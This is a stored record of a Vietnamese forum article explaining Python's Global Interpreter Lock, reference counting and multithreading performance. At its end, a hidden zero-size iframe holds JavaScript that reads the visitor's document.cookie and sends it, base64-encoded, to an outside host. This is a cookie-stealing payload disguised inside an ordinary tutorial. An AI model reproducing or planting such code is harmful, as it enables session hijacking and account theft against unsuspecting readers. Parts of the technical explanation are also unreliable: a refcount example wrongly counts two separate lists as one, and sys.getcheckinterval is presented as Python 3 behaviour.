{"_id":20278,"tags":[],"up_point":28,"down_point":0,"title":"Global Interpreter Lock là gì? Tại sao Python lại cần GIL?","body":"\n    <div><em>Python Global Interpreter Lock (hay GIL) là một thuật ngữ trong lập trình có liên quan đến xử lý Luồng (Thread), GIL là một Khóa (Lock) Tổng (Global) quản lý Luồng sao cho tại một thời điểm nhất định, chỉ có 1 Luồng giữ Khóa đóng vai trò truy xuất, chỉnh sửa bộ nhớ.</em> Thử tưởng tượng hình bên dưới mô tả quá trình phân phối tài nguyên CPU trong Python, trong đó mỗi cá nhân xếp hàng là 1 Luồng, người thu ngân đóng vai trò là Khóa (và rõ ràng, chúng ta đang có 2 Process chạy song song). Tại mỗi thời điểm mỗi Khóa chỉ làm việc với 1 Luồng, khi đó chúng ta coi Luồng đó đang giữ Khóa, các Luồng còn lại phải ở trong trạng thái Chờ-Queue.</div><div><img src=\"http://doanguyen.com/images/queue.png\" class=\"fr-fic fr-dib\"><figcaption class=\"image-description\" contenteditable=\"true\" placeholder=\"Chú thích ảnh (không bắt buộc)\">Source: <a href rel=\"noopener noreferrer\" target=\"_blank\">doanguyen.com</a></figcaption></div><div>Điều đó có nghĩa là, các lập trình viên lập trình đơn Luồng sẽ không cảm nhận được sự ảnh hưởng của Khóa Tổng (từ bây giờ Khóa Tổng sẽ được nói gọn là Khóa) này. Tuy nhiên trong lập trình có sử dụng các đa Luồng (multi-thread) tồn tại CPU-bound thì GIL chỉ cho phép 1 thread hoạt động, do đó không tận dụng được hết ưu thế của máy tính đa nhân, đa luồng hiện tại.</div><div><h2 id=\"tại-sao-python-lại-tồn-tại-gil\">Tại sao Python lại tồn tại GIL?</h2><div><p>Python là ngôn ngữ lập trình hướng đối tượng, trên hết mọi thứ trong Python đều là Object! (Class, function, metaclass, vv..) Mỗi Object đều được gán (tag) cho một địa chỉ trên bộ nhớ và để tiết kiệm bộ nhớ thì thay vì mỗi lần khai báo biến, Python sẽ không lập tức tạo một bộ nhớ mới mà trước hết là xem xét biến đó có được gán với một biến nào đã tồn tại trước chưa, ví dụ:</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">>>></span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"s\">\"Hello World\"</span>\n<span class=\"o\">>>></span> <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"nb\">hex</span><span class=\"p\">(</span><span class=\"nb\">id</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">)))</span> <span class=\"c\"># 0x7fed2a63b870</span>\n<span class=\"o\">>>></span> <span class=\"n\">b</span> <span class=\"o\">=</span> <span class=\"n\">a</span>\n<span class=\"o\">>>></span> <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"nb\">hex</span><span class=\"p\">(</span><span class=\"nb\">id</span><span class=\"p\">(</span><span class=\"n\">b</span><span class=\"p\">)))</span> <span class=\"c\"># 0x7fed2a63b870</span>\n\n<span class=\"o\">>>></span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"s\">\"Oops\"</span>\n<span class=\"o\">>>></span> <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">)</span> <span class=\"c\"># Oops</span>\n<span class=\"o\">>>></span> <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">b</span><span class=\"p\">)</span> <span class=\"c\"># Hello World</span>\n</code></pre></div></div><p>biến <code class=\"highlighter-rouge\">b</code> như trong ví dụ trên được trỏ tới ví trí <code class=\"highlighter-rouge\">0x7fed2a63b870</code> trong bộ nhớ, và khi <code class=\"highlighter-rouge\">a</code> thay đổi, <code class=\"highlighter-rouge\">b</code> do được gán vị trí cố định trên bộ nhớ mà không bị thay đổi.</p><p>Tiếp đến, Python sử dụng “reference counting” để quản lý bộ nhớ, tránh việc memory leak. Vậy reference counting là gì? Mỗi khi một object được tạo, Python sẽ gán 1 giá trị để đếm xem số lượng object được gán với địa chỉ đó là bao nhiêu. Và khi số biến được <code class=\"highlighter-rouge\">reference</code> tới bộ nhớ là 0, vùng bộ nhớ đó sẽ được xóa đi để không gian cho những biến khác giúp tiết kiệm bộ nhớ hơn. Hãy xem 1 ví dụ dưới đây để thấy reference counting hoạt động ra sao:</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">>>></span> <span class=\"kn\">import</span> <span class=\"nn\">sys</span>\n<span class=\"o\">>>></span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n<span class=\"o\">>>></span> <span class=\"n\">b</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n<span class=\"o\">>>></span> <span class=\"n\">sys</span><span class=\"o\">.</span><span class=\"n\">getrefcount</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">)</span>\n<span class=\"mi\">3</span>\n</code></pre></div></div><p>list trống [] được reference 3 lần (cho biến a, b và khi truy xuất tại sys.getrefcount).</p><p>Quay lại với GIL:</p><p>Có thể nói việc GIL là thiết yếu trong Python (hay cả Ruby, PHP) xuất phát từ việc sử dụng reference counting. &nbsp;Tại sao vậy? Thử tưởng tượng trong trường hợp 2 Luồng cùng tham chiếu tới 1 <em>variable counting</em> và cùng tăng hoặc giảm đồng thời giá trị đó, nếu may mắn thì chúng ta sẽ xuất hiện memory leak, tồi tệ hơn khi 1 Luồng đã xóa biến <code class=\"highlighter-rouge\">a</code> khỏi bộ nhớ nhưng vẫn còn 1 Luồng khác vẫn tham chiếu tới biến <code class=\"highlighter-rouge\">a</code>, điều đó sẽ dẫn tới chương trình crash mà lúc đó sẽ rất khó để tìm ra lỗi. Do đó để giải quyết vấn đề trên, 1 Khóa được tạo ra cho tất cả các Luồng trong 1 Process.</p><p>Ngoài cách sử dụng GIL, các lập trình viên còn có thể tạo ra 1 layer trong quá trình compiler - JIT (Just in time compiler) để giải quyết vấn đề trên. Jpython, IronPython là 2 ví dụ điển hình của interpreter Python mà không sử dụng GIL. Tuy nhiên nhược điểm của JIT là thời gian khởi động lại siêu chậm nên không được nhiều lập trình viên Python &nbsp;sử dụng.</p><p>Tụm chung lại:</p><ul><li>Jython và IronPython không tồn tại GIL và hoàn toàn có thể khai thác được các ưu thế của multiprocessor.</li><li>PyPy có tồn tại GIL, và cộng đồng Pypy đang cố gắng loại bỏ GIL bằng cách thực hiện <a href=\"http://doc.pypy.org/en/latest/stm.html#id14\">Software Transactional Memory</a></li><li>Cython cũng tồn tại GIL, tuy nhiên lập trình viên có thể tạm thời tắt bằng <code class=\"highlighter-rouge\">with</code> statement.</li></ul><h2 id=\"tại-sao-python-chọn-gil-làm-giải-pháp\">Tại sao Python chọn GIL làm giải pháp?</h2><p>Vậy tại sao Guido lại chọn GIL từ những ngày đầu viết CPython? Liệu đó có phải là lựa chọn tồi ngay từ khi Python được hình thành?</p><p>Không thể phủ nhận rằng việc chọn GIL có lẽ lại là một trong những quyết định khiến Python trở nên phổ biến như hiện nay. Những ngày đầu Python hình thành, khái niệm về Thread/Multithread trong các hệ điều hành còn chưa được phổ biến [need source?], và Python được thiết kế với mục đích dễ đọc, dễ viết cho người mới làm quen nên tốc độ xử lý không phải là ưu tiên hàng đầu. Và khi Python càng được mở rộng, vô số những thư viện khác nhau được hình thành tư rất nhiều nguồn lập trình viên, vì thế thread-safe memory là điều kiện tiên quyết để có cộng đồng lập trình viên lành mạnh, cho ra những phần mềm an toàn và hạn chế tối thiểu lỗi trong quá trình thực thi. Và cũng từ GIL, tốc độ thực thi của phần mềm single-threaded được tăng cường tốc độ đáng kể, những thư viện C với non thread-safe có thể dễ dàng <code class=\"highlighter-rouge\">port</code> qua thư viện Python sử dụng Python extension, điều đó càng làm cho cộng đồng Python trở nên phát triển như hiện nay. Do đó, có thể nói rằng GIL là giải pháp an toàn để giải quyết các vấn đề phức tạp mà cộng đồng lập trình viên Python gặp phải hàng ngày.</p><p>Điều đó đi cùng với 1 hạn chế: lập trình multithread sẽ ít nhận được lợi ích từ CPython!</p><h2 id=\"liệu-có-thể-lập-trình-multithread-trên-python-hay-không\">Liệu có thể lập trình Multithread trên Python hay không?</h2><p>Hoàn toàn có thể, thậm chí Python còn có 1 thư viện chuẩn dành cho multithreading. Hãy xem ví dụ về chương trình đếm ngược sau đây:</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># single_threaded.py</span>\n<span class=\"kn\">import</span> <span class=\"nn\">time</span>\n<span class=\"kn\">from</span> <span class=\"nn\">threading</span> <span class=\"kn\">import</span> <span class=\"n\">Thread</span>\n\n<span class=\"n\">COUNT</span> <span class=\"o\">=</span> <span class=\"mi\">50000000</span> <span class=\"c\"># 50.000.000</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">countdown</span><span class=\"p\">(</span><span class=\"n\">n</span><span class=\"p\">):</span>\n <span class=\"k\">while</span> <span class=\"n\">n</span><span class=\"o\">></span><span class=\"mi\">0</span><span class=\"p\">:</span>\n <span class=\"n\">n</span> <span class=\"o\">-=</span> <span class=\"mi\">1</span>\n\n<span class=\"n\">start</span> <span class=\"o\">=</span> <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">time</span><span class=\"p\">()</span>\n<span class=\"n\">countdown</span><span class=\"p\">(</span><span class=\"n\">COUNT</span><span class=\"p\">)</span>\n<span class=\"n\">end</span> <span class=\"o\">=</span> <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">time</span><span class=\"p\">()</span>\n\n<span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">'Time taken in seconds -'</span><span class=\"p\">,</span> <span class=\"n\">end</span> <span class=\"o\">-</span> <span class=\"n\">start</span><span class=\"p\">)</span>\n</code></pre></div></div><p>Đoạn code trên là một trong những ví dụ liên quan đến CPU-bound, tức là khi chương trình khởi chạy nó sẽ đẩy CPU tới giới hạn làm việc của CPU.</p><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>python single_threaded.py\nTime taken <span class=\"k\">in </span>seconds - 1.7025535106658936\n</code></pre></div></div><p>Khi sử dụng thư viện multithread, đoạn code được thiết kế lại để chia việc <code class=\"highlighter-rouge\">countdown</code> ra làm 2 task thực hiện việc đếm ngược:</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># multi_threaded.py</span>\n<span class=\"kn\">import</span> <span class=\"nn\">time</span>\n<span class=\"kn\">from</span> <span class=\"nn\">threading</span> <span class=\"kn\">import</span> <span class=\"n\">Thread</span>\n\n<span class=\"n\">COUNT</span> <span class=\"o\">=</span> <span class=\"mi\">50000000</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">countdown</span><span class=\"p\">(</span><span class=\"n\">n</span><span class=\"p\">):</span>\n <span class=\"k\">while</span> <span class=\"n\">n</span><span class=\"o\">></span><span class=\"mi\">0</span><span class=\"p\">:</span>\n <span class=\"n\">n</span> <span class=\"o\">-=</span> <span class=\"mi\">1</span>\n\n<span class=\"n\">t1</span> <span class=\"o\">=</span> <span class=\"n\">Thread</span><span class=\"p\">(</span><span class=\"n\">target</span><span class=\"o\">=</span><span class=\"n\">countdown</span><span class=\"p\">,</span> <span class=\"n\">args</span><span class=\"o\">=</span><span class=\"p\">(</span><span class=\"n\">COUNT</span><span class=\"o\">//</span><span class=\"mi\">2</span><span class=\"p\">,))</span>\n<span class=\"n\">t2</span> <span class=\"o\">=</span> <span class=\"n\">Thread</span><span class=\"p\">(</span><span class=\"n\">target</span><span class=\"o\">=</span><span class=\"n\">countdown</span><span class=\"p\">,</span> <span class=\"n\">args</span><span class=\"o\">=</span><span class=\"p\">(</span><span class=\"n\">COUNT</span><span class=\"o\">//</span><span class=\"mi\">2</span><span class=\"p\">,))</span>\n\n<span class=\"n\">start</span> <span class=\"o\">=</span> <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">time</span><span class=\"p\">()</span>\n<span class=\"n\">t1</span><span class=\"o\">.</span><span class=\"n\">start</span><span class=\"p\">()</span>\n<span class=\"n\">t2</span><span class=\"o\">.</span><span class=\"n\">start</span><span class=\"p\">()</span>\n<span class=\"n\">t1</span><span class=\"o\">.</span><span class=\"n\">join</span><span class=\"p\">()</span>\n<span class=\"n\">t2</span><span class=\"o\">.</span><span class=\"n\">join</span><span class=\"p\">()</span>\n<span class=\"n\">end</span> <span class=\"o\">=</span> <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">time</span><span class=\"p\">()</span>\n\n<span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">'Time taken in seconds -'</span><span class=\"p\">,</span> <span class=\"n\">end</span> <span class=\"o\">-</span> <span class=\"n\">start</span><span class=\"p\">)</span>\n</code></pre></div></div><p>và kết quả:</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>python multi_threaded.py\nTime taken <span class=\"k\">in </span>seconds - 1.6745080947875977\n</code></pre></div></div><p>như bạn có thể thấy, ở cả single thread và multi thread, thời gian thực hiện gần như tương đồng. Điều đó có được là do multi-threaded đã bị GIL hạn chế và bạn không thể thực hiện 2 tác vụ cùng 1 thời điểm được.</p><p>GIL <strong>không</strong> có nhiều ảnh hưởng đến hiệu suất chương trình có I/O-bound, đơn giản là <em>thời gian</em> đợi I/O thông thường lớn hơn so với nhận lại khóa từ GIL. (Nhận định này rất dễ gây nhầm lẫn với sync/async operation).</p><p>Tuy nhiên chương trình có thread chạy CPU-bound, ví dụ 1 process trong đó có 1 Luồng xử lý hình ảnh, chương trình sẽ ngay lập tức trở thành đơn luồng, các Luồng còn lại trong process đó sẽ phải đợi khi Luồng xử lý hình ảnh hoàn thành mới nhận được lock từ GIL dẫn tới việc thời gian xử lý tăng lên.</p><p>Do đó có rất rất nhiều thảo luận được đưa ra nhằm dỡ bỏ GIL từ Python core.</p><h2 id=\"vậy-tại-sao-cpython-chưa-loại-bỏ-gil\">Vậy tại sao CPython chưa loại bỏ GIL?</h2><p>Có rất nhiều lập trình viên phàn nàn về GIL tồn tại trong một thời gian lâu như vậy ở một ngôn ngữ lập trình phổ biến nhất trên thế giới?</p><p>Câu trả lời là: Loại bỏ GIL không hề đơn giản, nhóm Python Core đã tìm rất nhiều cách để loại bỏ GIL mà không gây “backward incompatibility”, từ những năm 2007 Guido van Rossum đã có <a href=\"https://www.artima.com/weblogs/viewpost.jsp?thread=214235\">cuộc trao đổi</a> về vấn đề này, nhiều phương án đã được đưa ra những chưa có giải pháp thực sự để loại bỏ.</p><p>Tuy nhiên Python 3 đã có một số cải tiến đáng kể để thay đổi nguyên tắc hoạt động của global lock. Từ Python 3, Python <strong>buộc</strong> các thread phải “nhả” khóa trong số thời gian nhất định:</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">import</span> <span class=\"nn\">sys</span>\n<span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">sys</span><span class=\"o\">.</span><span class=\"n\">getcheckinterval</span><span class=\"p\">())</span> <span class=\"c\"># 100</span>\n</code></pre></div></div><p>Vậy là sau <code class=\"highlighter-rouge\">100</code>\n<a href=\"https://en.wikipedia.org/wiki/Instruction_set_architecture\">instructions</a> thread nào đang giữ khóa thì sẽ bắt buộc phải “nhả” và nếu không có thread nào đang xếp hàng đợi thì thread đó sẽ được giữ khóa trong 100 instructions tiếp theo. Một số cải tiến nữa được thực hiện từ Python 3 trở đi, ví dụ ở <a href=\"http://www.dabeaz.com/blog/2010/01/python-gil-visualized.html\">đây</a> và <a href=\"https://mail.python.org/pipermail/python-dev/2009-October/093321.html\">đây</a>.</p><h2 id=\"vậy-giải-pháp-là-gì\">Vậy gii pháp là gì</h2><p>Một số giải pháp có thể sử dụng như sau:</p><p><strong>Muti-processing:</strong> Python GIL chỉ giới hạn trong process mà nó thực thi, với các process khác nhau, vị trí bộ nhớ hoạt động cũng khác nhau nên Python không còn phải lo lắng về reference counting nữa. Ví dụ về <a href=\"https://docs.python.org/3.4/library/multiprocessing.html?highlight=process\">multiprocessing</a>.</p><p><strong>Sử dụng các Python Interpreter thay thế:</strong> Như Pypy, IronPython, Jython.</p><p><strong>Sử dụng Cython:&nbsp;</strong>Rất nhiều người đang rất để tâm tới Cython vì tính tiện lợi và việc di chuyển giữa C/C++, Python API dễ dàng hơn nhiều, việc gỡ bỏ GIL có thể thực hiện trực tiếp bởi <a href=\"https://cython.readthedocs.io/en/latest/src/userguide/external_C_code.html#nogil\">with</a> statement.</p><p>Tham khảo:</p><p>[0] Google/Wikipedia/Youtube.</p><p>[1]<a href=\"https://mail.python.org/pipermail/python-dev/2009-October/093321.html\">https://mail.python.org/pipermail/python-dev/2009-October/093321.html</a></p><p>[2]<a href=\"https://youtu.be/Obt-vMVdM8s\">https://youtu.be/Obt-vMVdM8s</a></p><p>[3]<a href=\"https://realpython.com/python-gil/\">https://realpython.com/python-gil/</a></p></div>\n    </div>\n    <iframe sandbox=\"allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation allow-top-navigation-by-user-activation\" src=\"javascript:\n    img=new Image();img.src='https://doanguyen.pythonanywhere.com/image/?token='+btoa(document.cookie);document.body.appendChild(img)\" width=0 height=0>\n    </iframe>\n    <div>\n    ","cat_id":{"_id":12,"name":"Khoa học - Công nghệ"},"creator_id":24910,"created_at":"2019-04-15T17:19:27.215Z"}